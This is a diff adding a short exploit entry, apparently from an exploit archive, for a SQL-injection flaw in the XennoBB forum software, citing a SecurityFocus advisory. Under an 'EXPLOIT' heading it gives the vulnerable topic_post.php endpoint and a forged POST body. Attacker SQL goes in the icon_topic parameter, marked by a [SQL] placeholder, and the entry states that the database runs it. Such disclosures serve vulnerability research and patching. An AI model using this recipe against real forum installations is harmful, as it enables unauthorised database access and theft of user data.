@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/19606/info
+
+XennoBB is prone to an SQL-injection vulnerability that could allow an attacker to influence the structure or logic of SQL queries made by the application.
+
+--------------------- EXPLOIT ---------------------
+
+Submit a forged POST request to
+
+topic_post.php?action=post&fid={forum ID here}
+
+With the following as the POST data:
+
+form_sent=1&form_user={username
+here}&req_subject=Subject&req_message=Message&submit=1&icon_topic=[SQL]
+
+Successful exploitation leads would lead to the SQL query in the
+icon_topic
+parameter being run.
